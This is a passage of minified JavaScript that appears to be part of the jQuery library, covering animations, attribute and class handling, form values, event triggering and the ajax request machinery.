                v && le([e], !0),
                p.done(function () {
                  for (i in (v || le([e]), G.remove(e, "fxshow"), f))
                    b.style(e, i, f[i]);
                })),
              (l = rt(v ? g[i] : 0, i, p)),
              i in g ||
              ((g[i] = l.start), v && ((l.end = l.start), (l.start = 0)));
      },
    ],
    prefilter: function (e, t) {
      t ? st.prefilters.unshift(e) : st.prefilters.push(e);
    },
  })),
    (b.speed = function (e, t, n) {
      var i =
        e && "object" == typeof e
          ? b.extend({}, e)
          : {
            complete: n || (!n && t) || (v(e) && e),
            duration: e,
            easing: (n && t) || (t && !v(t) && t),
          };
      return (
        b.fx.off
          ? (i.duration = 0)
          : "number" != typeof i.duration &&
          (i.duration in b.fx.speeds
            ? (i.duration = b.fx.speeds[i.duration])
            : (i.duration = b.fx.speeds._default)),
        (null != i.queue && !0 !== i.queue) || (i.queue = "fx"),
        (i.old = i.complete),
        (i.complete = function () {
          v(i.old) && i.old.call(this), i.queue && b.dequeue(this, i.queue);
        }),
        i
      );
    }),
    b.fn.extend({
      fadeTo: function (e, t, n, i) {
        return this.filter(ie)
          .css("opacity", 0)
          .show()
          .end()
          .animate({ opacity: t }, e, n, i);
      },
      animate: function (e, t, n, i) {
        var o = b.isEmptyObject(e),
          r = b.speed(t, n, i),
          s = function () {
            var t = st(this, b.extend({}, e), r);
            (o || G.get(this, "finish")) && t.stop(!0);
          };
        return (
          (s.finish = s),
          o || !1 === r.queue ? this.each(s) : this.queue(r.queue, s)
        );
      },
      stop: function (e, t, n) {
        var i = function (e) {
          var t = e.stop;
          delete e.stop, t(n);
        };
        return (
          "string" != typeof e && ((n = t), (t = e), (e = void 0)),
          t && !1 !== e && this.queue(e || "fx", []),
          this.each(function () {
            var t = !0,
              o = null != e && e + "queueHooks",
              r = b.timers,
              s = G.get(this);
            if (o) s[o] && s[o].stop && i(s[o]);
            else for (o in s) s[o] && s[o].stop && tt.test(o) && i(s[o]);
            for (o = r.length; o--;)
              r[o].elem !== this ||
                (null != e && r[o].queue !== e) ||
                (r[o].anim.stop(n), (t = !1), r.splice(o, 1));
            (!t && n) || b.dequeue(this, e);
          })
        );
      },
      finish: function (e) {
        return (
          !1 !== e && (e = e || "fx"),
          this.each(function () {
            var t,
              n = G.get(this),
              i = n[e + "queue"],
              o = n[e + "queueHooks"],
              r = b.timers,
              s = i ? i.length : 0;
            for (
              n.finish = !0,
              b.queue(this, e, []),
              o && o.stop && o.stop.call(this, !0),
              t = r.length;
              t--;

            )
              r[t].elem === this &&
                r[t].queue === e &&
                (r[t].anim.stop(!0), r.splice(t, 1));
            for (t = 0; t < s; t++)
              i[t] && i[t].finish && i[t].finish.call(this);
            delete n.finish;
          })
        );
      },
    }),
    b.each(["toggle", "show", "hide"], function (e, t) {
      var n = b.fn[t];
      b.fn[t] = function (e, i, o) {
        return null == e || "boolean" == typeof e
          ? n.apply(this, arguments)
          : this.animate(ot(t, !0), e, i, o);
      };
    }),
    b.each(
      {
        slideDown: ot("show"),
        slideUp: ot("hide"),
        slideToggle: ot("toggle"),
        fadeIn: { opacity: "show" },
        fadeOut: { opacity: "hide" },
        fadeToggle: { opacity: "toggle" },
      },
      function (e, t) {
        b.fn[e] = function (e, n, i) {
          return this.animate(t, e, n, i);
        };
      }
    ),
    (b.timers = []),
    (b.fx.tick = function () {
      var e,
        t = 0,
        n = b.timers;
      for (Ke = Date.now(); t < n.length; t++)
        (e = n[t])() || n[t] !== e || n.splice(t--, 1);
      n.length || b.fx.stop(), (Ke = void 0);
    }),
    (b.fx.timer = function (e) {
      b.timers.push(e), b.fx.start();
    }),
    (b.fx.interval = 13),
    (b.fx.start = function () {
      Ze || ((Ze = !0), nt());
    }),
    (b.fx.stop = function () {
      Ze = null;
    }),
    (b.fx.speeds = { slow: 600, fast: 200, _default: 400 }),
    (b.fn.delay = function (t, n) {
      return (
        (t = (b.fx && b.fx.speeds[t]) || t),
        (n = n || "fx"),
        this.queue(n, function (n, i) {
          var o = e.setTimeout(n, t);
          i.stop = function () {
            e.clearTimeout(o);
          };
        })
      );
    }),
    (function () {
      var e = i.createElement("input"),
        t = i.createElement("select").appendChild(i.createElement("option"));
      (e.type = "checkbox"),
        (h.checkOn = "" !== e.value),
        (h.optSelected = t.selected),
        ((e = i.createElement("input")).value = "t"),
        (e.type = "radio"),
        (h.radioValue = "t" === e.value);
    })();
  var at,
    lt = b.expr.attrHandle;
  b.fn.extend({
    attr: function (e, t) {
      return F(this, b.attr, e, t, arguments.length > 1);
    },
    removeAttr: function (e) {
      return this.each(function () {
        b.removeAttr(this, e);
      });
    },
  }),
    b.extend({
      attr: function (e, t, n) {
        var i,
          o,
          r = e.nodeType;
        if (3 !== r && 8 !== r && 2 !== r)
          return void 0 === e.getAttribute
            ? b.prop(e, t, n)
            : ((1 === r && b.isXMLDoc(e)) ||
              (o =
                b.attrHooks[t.toLowerCase()] ||
                (b.expr.match.bool.test(t) ? at : void 0)),
              void 0 !== n
                ? null === n
                  ? void b.removeAttr(e, t)
                  : o && "set" in o && void 0 !== (i = o.set(e, n, t))
                    ? i
                    : (e.setAttribute(t, n + ""), n)
                : o && "get" in o && null !== (i = o.get(e, t))
                  ? i
                  : null == (i = b.find.attr(e, t))
                    ? void 0
                    : i);
      },
      attrHooks: {
        type: {
          set: function (e, t) {
            if (!h.radioValue && "radio" === t && A(e, "input")) {
              var n = e.value;
              return e.setAttribute("type", t), n && (e.value = n), t;
            }
          },
        },
      },
      removeAttr: function (e, t) {
        var n,
          i = 0,
          o = t && t.match(P);
        if (o && 1 === e.nodeType) for (; (n = o[i++]);) e.removeAttribute(n);
      },
    }),
    (at = {
      set: function (e, t, n) {
        return !1 === t ? b.removeAttr(e, n) : e.setAttribute(n, n), n;
      },
    }),
    b.each(b.expr.match.bool.source.match(/\w+/g), function (e, t) {
      var n = lt[t] || b.find.attr;
      lt[t] = function (e, t, i) {
        var o,
          r,
          s = t.toLowerCase();
        return (
          i ||
          ((r = lt[s]),
            (lt[s] = o),
            (o = null != n(e, t, i) ? s : null),
            (lt[s] = r)),
          o
        );
      };
    });
  var ct = /^(?:input|select|textarea|button)$/i,
    dt = /^(?:a|area)$/i;
  function ut(e) {
    return (e.match(P) || []).join(" ");
  }
  function pt(e) {
    return (e.getAttribute && e.getAttribute("class")) || "";
  }
  function ft(e) {
    return Array.isArray(e) ? e : ("string" == typeof e && e.match(P)) || [];
  }
  b.fn.extend({
    prop: function (e, t) {
      return F(this, b.prop, e, t, arguments.length > 1);
    },
    removeProp: function (e) {
      return this.each(function () {
        delete this[b.propFix[e] || e];
      });
    },
  }),
    b.extend({
      prop: function (e, t, n) {
        var i,
          o,
          r = e.nodeType;
        if (3 !== r && 8 !== r && 2 !== r)
          return (
            (1 === r && b.isXMLDoc(e)) ||
            ((t = b.propFix[t] || t), (o = b.propHooks[t])),
            void 0 !== n
              ? o && "set" in o && void 0 !== (i = o.set(e, n, t))
                ? i
                : (e[t] = n)
              : o && "get" in o && null !== (i = o.get(e, t))
                ? i
                : e[t]
          );
      },
      propHooks: {
        tabIndex: {
          get: function (e) {
            var t = b.find.attr(e, "tabindex");
            return t
              ? parseInt(t, 10)
              : ct.test(e.nodeName) || (dt.test(e.nodeName) && e.href)
                ? 0
                : -1;
          },
        },
      },
      propFix: { for: "htmlFor", class: "className" },
    }),
    h.optSelected ||
    (b.propHooks.selected = {
      get: function (e) {
        var t = e.parentNode;
        return t && t.parentNode && t.parentNode.selectedIndex, null;
      },
      set: function (e) {
        var t = e.parentNode;
        t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex);
      },
    }),
    b.each(
      [
        "tabIndex",
        "readOnly",
        "maxLength",
        "cellSpacing",
        "cellPadding",
        "rowSpan",
        "colSpan",
        "useMap",
        "frameBorder",
        "contentEditable",
      ],
      function () {
        b.propFix[this.toLowerCase()] = this;
      }
    ),
    b.fn.extend({
      addClass: function (e) {
        var t,
          n,
          i,
          o,
          r,
          s,
          a,
          l = 0;
        if (v(e))
          return this.each(function (t) {
            b(this).addClass(e.call(this, t, pt(this)));
          });
        if ((t = ft(e)).length)
          for (; (n = this[l++]);)
            if (((o = pt(n)), (i = 1 === n.nodeType && " " + ut(o) + " "))) {
              for (s = 0; (r = t[s++]);)
                i.indexOf(" " + r + " ") < 0 && (i += r + " ");
              o !== (a = ut(i)) && n.setAttribute("class", a);
            }
        return this;
      },
      removeClass: function (e) {
        var t,
          n,
          i,
          o,
          r,
          s,
          a,
          l = 0;
        if (v(e))
          return this.each(function (t) {
            b(this).removeClass(e.call(this, t, pt(this)));
          });
        if (!arguments.length) return this.attr("class", "");
        if ((t = ft(e)).length)
          for (; (n = this[l++]);)
            if (((o = pt(n)), (i = 1 === n.nodeType && " " + ut(o) + " "))) {
              for (s = 0; (r = t[s++]);)
                for (; i.indexOf(" " + r + " ") > -1;)
                  i = i.replace(" " + r + " ", " ");
              o !== (a = ut(i)) && n.setAttribute("class", a);
            }
        return this;
      },
      toggleClass: function (e, t) {
        var n = typeof e,
          i = "string" === n || Array.isArray(e);
        return "boolean" == typeof t && i
          ? t
            ? this.addClass(e)
            : this.removeClass(e)
          : v(e)
            ? this.each(function (n) {
              b(this).toggleClass(e.call(this, n, pt(this), t), t);
            })
            : this.each(function () {
              var t, o, r, s;
              if (i)
                for (o = 0, r = b(this), s = ft(e); (t = s[o++]);)
                  r.hasClass(t) ? r.removeClass(t) : r.addClass(t);
              else
                (void 0 !== e && "boolean" !== n) ||
                  ((t = pt(this)) && G.set(this, "__className__", t),
                    this.setAttribute &&
                    this.setAttribute(
                      "class",
                      t || !1 === e ? "" : G.get(this, "__className__") || ""
                    ));
            });
      },
      hasClass: function (e) {
        var t,
          n,
          i = 0;
        for (t = " " + e + " "; (n = this[i++]);)
          if (1 === n.nodeType && (" " + ut(pt(n)) + " ").indexOf(t) > -1)
            return !0;
        return !1;
      },
    });
  var ht = /\r/g;
  b.fn.extend({
    val: function (e) {
      var t,
        n,
        i,
        o = this[0];
      return arguments.length
        ? ((i = v(e)),
          this.each(function (n) {
            var o;
            1 === this.nodeType &&
              (null == (o = i ? e.call(this, n, b(this).val()) : e)
                ? (o = "")
                : "number" == typeof o
                  ? (o += "")
                  : Array.isArray(o) &&
                  (o = b.map(o, function (e) {
                    return null == e ? "" : e + "";
                  })),
                ((t =
                  b.valHooks[this.type] ||
                  b.valHooks[this.nodeName.toLowerCase()]) &&
                  "set" in t &&
                  void 0 !== t.set(this, o, "value")) ||
                (this.value = o));
          }))
        : o
          ? (t = b.valHooks[o.type] || b.valHooks[o.nodeName.toLowerCase()]) &&
            "get" in t &&
            void 0 !== (n = t.get(o, "value"))
            ? n
            : "string" == typeof (n = o.value)
              ? n.replace(ht, "")
              : null == n
                ? ""
                : n
          : void 0;
    },
  }),
    b.extend({
      valHooks: {
        option: {
          get: function (e) {
            var t = b.find.attr(e, "value");
            return null != t ? t : ut(b.text(e));
          },
        },
        select: {
          get: function (e) {
            var t,
              n,
              i,
              o = e.options,
              r = e.selectedIndex,
              s = "select-one" === e.type,
              a = s ? null : [],
              l = s ? r + 1 : o.length;
            for (i = r < 0 ? l : s ? r : 0; i < l; i++)
              if (
                ((n = o[i]).selected || i === r) &&
                !n.disabled &&
                (!n.parentNode.disabled || !A(n.parentNode, "optgroup"))
              ) {
                if (((t = b(n).val()), s)) return t;
                a.push(t);
              }
            return a;
          },
          set: function (e, t) {
            for (
              var n, i, o = e.options, r = b.makeArray(t), s = o.length;
              s--;

            )
              ((i = o[s]).selected =
                b.inArray(b.valHooks.option.get(i), r) > -1) && (n = !0);
            return n || (e.selectedIndex = -1), r;
          },
        },
      },
    }),
    b.each(["radio", "checkbox"], function () {
      (b.valHooks[this] = {
        set: function (e, t) {
          if (Array.isArray(t))
            return (e.checked = b.inArray(b(e).val(), t) > -1);
        },
      }),
        h.checkOn ||
        (b.valHooks[this].get = function (e) {
          return null === e.getAttribute("value") ? "on" : e.value;
        });
    }),
    (h.focusin = "onfocusin" in e);
  var vt = /^(?:focusinfocus|focusoutblur)$/,
    gt = function (e) {
      e.stopPropagation();
    };
  b.extend(b.event, {
    trigger: function (t, n, o, r) {
      var s,
        a,
        l,
        c,
        d,
        p,
        f,
        h,
        y = [o || i],
        m = u.call(t, "type") ? t.type : t,
        w = u.call(t, "namespace") ? t.namespace.split(".") : [];
      if (
        ((a = h = l = o = o || i),
          3 !== o.nodeType &&
          8 !== o.nodeType &&
          !vt.test(m + b.event.triggered) &&
          (m.indexOf(".") > -1 && ((m = (w = m.split(".")).shift()), w.sort()),
            (d = m.indexOf(":") < 0 && "on" + m),
            ((t = t[b.expando]
              ? t
              : new b.Event(m, "object" == typeof t && t)).isTrigger = r ? 2 : 3),
            (t.namespace = w.join(".")),
            (t.rnamespace = t.namespace
              ? new RegExp("(^|\\.)" + w.join("\\.(?:.*\\.|)") + "(\\.|$)")
              : null),
            (t.result = void 0),
            t.target || (t.target = o),
            (n = null == n ? [t] : b.makeArray(n, [t])),
            (f = b.event.special[m] || {}),
            r || !f.trigger || !1 !== f.trigger.apply(o, n)))
      ) {
        if (!r && !f.noBubble && !g(o)) {
          for (
            c = f.delegateType || m, vt.test(c + m) || (a = a.parentNode);
            a;
            a = a.parentNode
          )
            y.push(a), (l = a);
          l === (o.ownerDocument || i) &&
            y.push(l.defaultView || l.parentWindow || e);
        }
        for (s = 0; (a = y[s++]) && !t.isPropagationStopped();)
          (h = a),
            (t.type = s > 1 ? c : f.bindType || m),
            (p = (G.get(a, "events") || {})[t.type] && G.get(a, "handle")) &&
            p.apply(a, n),
            (p = d && a[d]) &&
            p.apply &&
            Y(a) &&
            ((t.result = p.apply(a, n)),
              !1 === t.result && t.preventDefault());
        return (
          (t.type = m),
          r ||
          t.isDefaultPrevented() ||
          (f._default && !1 !== f._default.apply(y.pop(), n)) ||
          !Y(o) ||
          (d &&
            v(o[m]) &&
            !g(o) &&
            ((l = o[d]) && (o[d] = null),
              (b.event.triggered = m),
              t.isPropagationStopped() && h.addEventListener(m, gt),
              o[m](),
              t.isPropagationStopped() && h.removeEventListener(m, gt),
              (b.event.triggered = void 0),
              l && (o[d] = l))),
          t.result
        );
      }
    },
    simulate: function (e, t, n) {
      var i = b.extend(new b.Event(), n, { type: e, isSimulated: !0 });
      b.event.trigger(i, null, t);
    },
  }),
    b.fn.extend({
      trigger: function (e, t) {
        return this.each(function () {
          b.event.trigger(e, t, this);
        });
      },
      triggerHandler: function (e, t) {
        var n = this[0];
        if (n) return b.event.trigger(e, t, n, !0);
      },
    }),
    h.focusin ||
    b.each({ focus: "focusin", blur: "focusout" }, function (e, t) {
      var n = function (e) {
        b.event.simulate(t, e.target, b.event.fix(e));
      };
      b.event.special[t] = {
        setup: function () {
          var i = this.ownerDocument || this,
            o = G.access(i, t);
          o || i.addEventListener(e, n, !0), G.access(i, t, (o || 0) + 1);
        },
        teardown: function () {
          var i = this.ownerDocument || this,
            o = G.access(i, t) - 1;
          o
            ? G.access(i, t, o)
            : (i.removeEventListener(e, n, !0), G.remove(i, t));
        },
      };
    });
  var yt = e.location,
    mt = Date.now(),
    wt = /\?/;
  b.parseXML = function (t) {
    var n;
    if (!t || "string" != typeof t) return null;
    try {
      n = new e.DOMParser().parseFromString(t, "text/xml");
    } catch (e) {
      n = void 0;
    }
    return (
      (n && !n.getElementsByTagName("parsererror").length) ||
      b.error("Invalid XML: " + t),
      n
    );
  };
  var bt = /\[\]$/,
    xt = /\r?\n/g,
    kt = /^(?:submit|button|image|reset|file)$/i,
    Tt = /^(?:input|select|textarea|keygen)/i;
  function St(e, t, n, i) {
    var o;
    if (Array.isArray(t))
      b.each(t, function (t, o) {
        n || bt.test(e)
          ? i(e, o)
          : St(
            e + "[" + ("object" == typeof o && null != o ? t : "") + "]",
            o,
            n,
            i
          );
      });
    else if (n || "object" !== w(t)) i(e, t);
    else for (o in t) St(e + "[" + o + "]", t[o], n, i);
  }
  (b.param = function (e, t) {
    var n,
      i = [],
      o = function (e, t) {
        var n = v(t) ? t() : t;
        i[i.length] =
          encodeURIComponent(e) + "=" + encodeURIComponent(null == n ? "" : n);
      };
    if (Array.isArray(e) || (e.jquery && !b.isPlainObject(e)))
      b.each(e, function () {
        o(this.name, this.value);
      });
    else for (n in e) St(n, e[n], t, o);
    return i.join("&");
  }),
    b.fn.extend({
      serialize: function () {
        return b.param(this.serializeArray());
      },
      serializeArray: function () {
        return this.map(function () {
          var e = b.prop(this, "elements");
          return e ? b.makeArray(e) : this;
        })
          .filter(function () {
            var e = this.type;
            return (
              this.name &&
              !b(this).is(":disabled") &&
              Tt.test(this.nodeName) &&
              !kt.test(e) &&
              (this.checked || !ce.test(e))
            );
          })
          .map(function (e, t) {
            var n = b(this).val();
            return null == n
              ? null
              : Array.isArray(n)
                ? b.map(n, function (e) {
                  return { name: t.name, value: e.replace(xt, "\r\n") };
                })
                : { name: t.name, value: n.replace(xt, "\r\n") };
          })
          .get();
      },
    });
  var Ct = /%20/g,
    $t = /#.*$/,
    At = /([?&])_=[^&]*/,
    Et = /^(.*?):[ \t]*([^\r\n]*)$/gm,
    jt = /^(?:GET|HEAD)$/,
    Dt = /^\/\//,
    Nt = {},
    Ht = {},
    Ot = "*/".concat("*"),
    Lt = i.createElement("a");
  function Pt(e) {
    return function (t, n) {
      "string" != typeof t && ((n = t), (t = "*"));
      var i,
        o = 0,
        r = t.toLowerCase().match(P) || [];
      if (v(n))
        for (; (i = r[o++]);)
          "+" === i[0]
            ? ((i = i.slice(1) || "*"), (e[i] = e[i] || []).unshift(n))
            : (e[i] = e[i] || []).push(n);
    };
  }
  function qt(e, t, n, i) {
    var o = {},
      r = e === Ht;
    function s(a) {
      var l;
      return (
        (o[a] = !0),
        b.each(e[a] || [], function (e, a) {
          var c = a(t, n, i);
          return "string" != typeof c || r || o[c]
            ? r
              ? !(l = c)
              : void 0
            : (t.dataTypes.unshift(c), s(c), !1);
        }),
        l
      );
    }
    return s(t.dataTypes[0]) || (!o["*"] && s("*"));
  }
  function Mt(e, t) {
    var n,
      i,
      o = b.ajaxSettings.flatOptions || {};
    for (n in t) void 0 !== t[n] && ((o[n] ? e : i || (i = {}))[n] = t[n]);
    return i && b.extend(!0, e, i), e;
  }
  (Lt.href = yt.href),
    b.extend({
      active: 0,
      lastModified: {},
      etag: {},
      ajaxSettings: {
        url: yt.href,
        type: "GET",
        isLocal:
          /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(
            yt.protocol
          ),
        global: !0,
        processData: !0,
        async: !0,
        contentType: "application/x-www-form-urlencoded; charset=UTF-8",
        accepts: {
          "*": Ot,
          text: "text/plain",
          html: "text/html",
          xml: "application/xml, text/xml",
          json: "application/json, text/javascript",
        },
        contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ },
        responseFields: {
          xml: "responseXML",
          text: "responseText",
          json: "responseJSON",
        },
        converters: {
          "* text": String,
          "text html": !0,
          "text json": JSON.parse,
          "text xml": b.parseXML,
        },
        flatOptions: { url: !0, context: !0 },
      },
      ajaxSetup: function (e, t) {
        return t ? Mt(Mt(e, b.ajaxSettings), t) : Mt(b.ajaxSettings, e);
      },
      ajaxPrefilter: Pt(Nt),
      ajaxTransport: Pt(Ht),
      ajax: function (t, n) {
        "object" == typeof t && ((n = t), (t = void 0)), (n = n || {});
        var o,
          r,
          s,
          a,
          l,
          c,
          d,
          u,
          p,
          f,
          h = b.ajaxSetup({}, n),
          v = h.context || h,
          g = h.context && (v.nodeType || v.jquery) ? b(v) : b.event,
          y = b.Deferred(),
          m = b.Callbacks("once memory"),
          w = h.statusCode || {},
          x = {},
          k = {},
          T = "canceled",
          S = {
            readyState: 0,
            getResponseHeader: function (e) {
              var t;
              if (d) {
                if (!a)
                  for (a = {}; (t = Et.exec(s));) a[t[1].toLowerCase()] = t[2];
                t = a[e.toLowerCase()];
              }
              return null == t ? null : t;
            },
            getAllResponseHeaders: function () {
              return d ? s : null;
            },
            setRequestHeader: function (e, t) {
              return (
                null == d &&
                ((e = k[e.toLowerCase()] = k[e.toLowerCase()] || e),
                  (x[e] = t)),
                this
              );
            },
            overrideMimeType: function (e) {
              return null == d && (h.mimeType = e), this;
            },
            statusCode: function (e) {
              var t;
              if (e)
                if (d) S.always(e[S.status]);
                else for (t in e) w[t] = [w[t], e[t]];
              return this;
            },
            abort: function (e) {
              var t = e || T;
              return o && o.abort(t), C(0, t), this;
            },
          };
        if (
          (y.promise(S),
            (h.url = ((t || h.url || yt.href) + "").replace(
              Dt,
              yt.protocol + "//"
            )),
            (h.type = n.method || n.type || h.method || h.type),
            (h.dataTypes = (h.dataType || "*").toLowerCase().match(P) || [""]),
            null == h.crossDomain)
        ) {
          c = i.createElement("a");
          try {
            (c.href = h.url),
              (c.href = c.href),
              (h.crossDomain =
                Lt.protocol + "//" + Lt.host != c.protocol + "//" + c.host);
          } catch (e) {
            h.crossDomain = !0;
          }
        }
        if (
          (h.data &&
            h.processData &&
            "string" != typeof h.data &&
            (h.data = b.param(h.data, h.traditional)),
            qt(Nt, h, n, S),
            d)
        )
          return S;
        for (p in ((u = b.event && h.global) &&
          0 == b.active++ &&
          b.event.trigger("ajaxStart"),
          (h.type = h.type.toUpperCase()),
          (h.hasContent = !jt.test(h.type)),
          (r = h.url.replace($t, "")),
          h.hasContent
            ? h.data &&
            h.processData &&
            0 ===
            (h.contentType || "").indexOf(
              "application/x-www-form-urlencoded"
            ) &&
            (h.data = h.data.replace(Ct, "+"))
            : ((f = h.url.slice(r.length)),
              h.data &&
              (h.processData || "string" == typeof h.data) &&
              ((r += (wt.test(r) ? "&" : "?") + h.data), delete h.data),
              !1 === h.cache &&
              ((r = r.replace(At, "$1")),
                (f = (wt.test(r) ? "&" : "?") + "_=" + mt++ + f)),
              (h.url = r + f)),
          h.ifModified &&
          (b.lastModified[r] &&
            S.setRequestHeader("If-Modified-Since", b.lastModified[r]),
            b.etag[r] && S.setRequestHeader("If-None-Match", b.etag[r])),
          ((h.data && h.hasContent && !1 !== h.contentType) || n.contentType) &&
          S.setRequestHeader("Content-Type", h.contentType),
          S.setRequestHeader(
            "Accept",
            h.dataTypes[0] && h.accepts[h.dataTypes[0]]
              ? h.accepts[h.dataTypes[0]] +
              ("*" !== h.dataTypes[0] ? ", " + Ot + "; q=0.01" : "")
              : h.accepts["*"]
          ),
          h.headers))
          S.setRequestHeader(p, h.headers[p]);
        if (h.beforeSend && (!1 === h.beforeSend.call(v, S, h) || d))
          return S.abort();
        if (
          ((T = "abort"),
            m.add(h.complete),
            S.done(h.success),
            S.fail(h.error),
            (o = qt(Ht, h, n, S)))
        ) {
          if (((S.readyState = 1), u && g.trigger("ajaxSend", [S, h]), d))
            return S;
          h.async &&
            h.timeout > 0 &&
            (l = e.setTimeout(function () {
              S.abort("timeout");
            }, h.timeout));
          try {
            (d = !1), o.send(x, C);
          } catch (e) {
            if (d) throw e;
            C(-1, e);
          }
        } else C(-1, "No Transport");
        function C(t, n, i, a) {
          var c,
            p,
            f,
            x,
            k,
            T = n;
          d ||
            ((d = !0),
              l && e.clearTimeout(l),
              (o = void 0),
              (s = a || ""),
              (S.readyState = t > 0 ? 4 : 0),
              (c = (t >= 200 && t < 300) || 304 === t),
              i &&
              (x = (function (e, t, n) {
                for (
                  var i, o, r, s, a = e.contents, l = e.dataTypes;
                  "*" === l[0];

                )
                  l.shift(),
                    void 0 === i &&
                    (i = e.mimeType || t.getResponseHeader("Content-Type"));
                if (i)
                  for (o in a)
                    if (a[o] && a[o].test(i)) {
                      l.unshift(o);
                      break;
                    }
                if (l[0] in n) r = l[0];
                else {
                  for (o in n) {
                    if (!l[0] || e.converters[o + " " + l[0]]) {
                      r = o;
                      break;
                    }
                    s || (s = o);
                  }
                  r = r || s;
                }
                if (r) return r !== l[0] && l.unshift(r), n[r];
              })(h, S, i)),
              (x = (function (e, t, n, i) {
                var o,
                  r,
                  s,
                  a,
                  l,
                  c = {},
                  d = e.dataTypes.slice();
                if (d[1])
                  for (s in e.converters) c[s.toLowerCase()] = e.converters[s];
                for (r = d.shift(); r;)
                  if (
                    (e.responseFields[r] && (n[e.responseFields[r]] = t),
                      !l && i && e.dataFilter && (t = e.dataFilter(t, e.dataType)),
                      (l = r),
                      (r = d.shift()))
                  )
                    if ("*" === r) r = l;
                    else if ("*" !== l && l !== r) {
                      if (!(s = c[l + " " + r] || c["* " + r]))
                        for (o in c)
                          if (
                            (a = o.split(" "))[1] === r &&
                            (s = c[l + " " + a[0]] || c["* " + a[0]])
                          ) {
                            !0 === s
                              ? (s = c[o])
                              : !0 !== c[o] && ((r = a[0]), d.unshift(a[1]));
                            break;
                          }
                      if (!0 !== s)
                        if (s && e.throws) t = s(t);
                        else
                          try {
                            t = s(t);
                          } catch (e) {
                            return {
                              state: "parsererror",
                              error: s
                                ? e
                                : "No conversion from " + l + " to " + r,
                            };
                          }
                    }
                return { state: "success", data: t };
              })(h, x, S, c)),
              c
                ? (h.ifModified &&
                  ((k = S.getResponseHeader("Last-Modified")) &&
                    (b.lastModified[r] = k),
                    (k = S.getResponseHeader("etag")) && (b.etag[r] = k)),
                  204 === t || "HEAD" === h.type
                    ? (T = "nocontent")
                    : 304 === t
                      ? (T = "notmodified")
                      : ((T = x.state), (p = x.data), (c = !(f = x.error))))
                : ((f = T), (!t && T) || ((T = "error"), t < 0 && (t = 0))),
              (S.status = t),
              (S.statusText = (n || T) + ""),
              c ? y.resolveWith(v, [p, T, S]) : y.rejectWith(v, [S, T, f]),
              S.statusCode(w),
              (w = void 0),
              u && g.trigger(c ? "ajaxSuccess" : "ajaxError", [S, h, c ? p : f]),
              m.fireWith(v, [S, T]),
              u &&
              (g.trigger("ajaxComplete", [S, h]),
                --b.active || b.event.trigger("ajaxStop")));
        }
        return S;
      },
      getJSON: function (e, t, n) {
        return b.get(e, t, n, "json");
      },
      getScript: function (e, t) {
        return b.get(e, void 0, t, "script");
      },
    }),
    b.each(["get", "post"], function (e, t) {
      b[t] = function (e, n, i, o) {
        return (
          v(n) && ((o = o || i), (i = n), (n = void 0)),
          b.ajax(
            b.extend(
              { url: e, type: t, dataType: o, data: n, success: i },
              b.isPlainObject(e) && e
            )
          )
        );
      };
    }),
    (b._evalUrl = function (e) {
      return b.ajax({
        url: e,
        type: "GET",
        dataType: "script",
        cache: !0,
        async: !1,
        global: !1,
        throws: !0,
      });
    }),
    b.fn.extend({
      wrapAll: function (e) {
        var t;
        return (
          this[0] &&
          (v(e) && (e = e.call(this[0])),
            (t = b(e, this[0].ownerDocument).eq(0).clone(!0)),
            this[0].parentNode && t.insertBefore(this[0]),
            t
              .map(function () {
                for (var e = this; e.firstElementChild;)
                  e = e.firstElementChild;
                return e;
              })
              .append(this)),
          this
        );
      },
      wrapInner: function (e) {
        return v(e)
          ? this.each(function (t) {
            b(this).wrapInner(e.call(this, t));
          })
          : this.each(function () {
            var t = b(this),
              n = t.contents();
            n.length ? n.wrapAll(e) : t.append(e);
          });
      },
      wrap: function (e) {
        var t = v(e);
        return this.each(function (n) {
          b(this).wrapAll(t ? e.call(this, n) : e);
        });
      },
      unwrap: function (e) {
        return (
          this.parent(e)
            .not("body")
            .each(function () {
              b(this).replaceWith(this.childNodes);
            }),
          this
        );
      },
    }),
    (b.expr.pseudos.hidden = function (e) {
      return !b.expr.pseudos.visible(e);
    }),
    (b.expr.pseudos.visible = function (e) {
      return !!(e.offsetWidth || e.offsetHeight || e.getClientRects().length);
    }),
    (b.ajaxSettings.xhr = function () {
      try {
        return new e.XMLHttpRequest();
      } catch (e) { }
    });
  var It = { 0: 200, 1223: 204 },
    zt = b.ajaxSettings.xhr();
  (h.cors = !!zt && "withCredentials" in zt),
    (h.ajax = zt = !!zt),
    b.ajaxTransport(function (t) {
      var n, i;
      if (h.cors || (zt && !t.crossDomain))
        return {
          send: function (o, r) {
            var s,
              a = t.xhr();
            if (
              (a.open(t.type, t.url, t.async, t.username, t.password),
                t.xhrFields)
            )
              for (s in t.xhrFields) a[s] = t.xhrFields[s];
            for (s in (t.mimeType &&
              a.overrideMimeType &&
              a.overrideMimeType(t.mimeType),
              t.crossDomain ||
              o["X-Requested-With"] ||
              (o["X-Requested-With"] = "XMLHttpRequest"),
              o))
              a.setRequestHeader(s, o[s]);
            (n = function (e) {
              return function () {
                n &&
                  ((n =
                    i =
                    a.onload =
                    a.onerror =
                    a.onabort =
                    a.ontimeout =
                    a.onreadystatechange =
                    null),
                    "abort" === e
                      ? a.abort()
                      : "error" === e
                        ? "number" != typeof a.status
                          ? r(0, "error")
                          : r(a.status, a.statusText)
                        : r(
                          It[a.status] || a.status,
                          a.statusText,
                          "text" !== (a.responseType || "text") ||
                            "string" != typeof a.responseText
                            ? { binary: a.response }
                            : { text: a.responseText },
                          a.getAllResponseHeaders()
                        ));
              };
            }),
              (a.onload = n()),
              (i = a.onerror = a.ontimeout = n("error")),
              void 0 !== a.onabort
                ? (a.onabort = i)
                : (a.onreadystatechange = function () {
                  4 === a.readyState &&
                    e.setTimeout(function () {
                      n && i();
                    });
                }),
              (n = n("abort"));
            try {
              a.send((t.hasContent && t.data) || null);
            } catch (e) {
              if (n) throw e;
            }
          },
          abort: function () {
            n && n();
          },
        };
    }),
    b.ajaxPrefilter(function (e) {
      e.crossDomain && (e.contents.script = !1);
    }),
    b.ajaxSetup({
      accepts: {
        script:
          "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript",
      },
      contents: { script: /\b(?:java|ecma)script\b/ },
      converters: {
        "text script": function (e) {
          return b.globalEval(e), e;
        },
      },
    }),
    b.ajaxPrefilter("script", function (e) {
      void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET");
    }),
    b.ajaxTransport("script", function (e) {
      var t, n;
      if (e.crossDomain)
        return {
          send: function (o, r) {
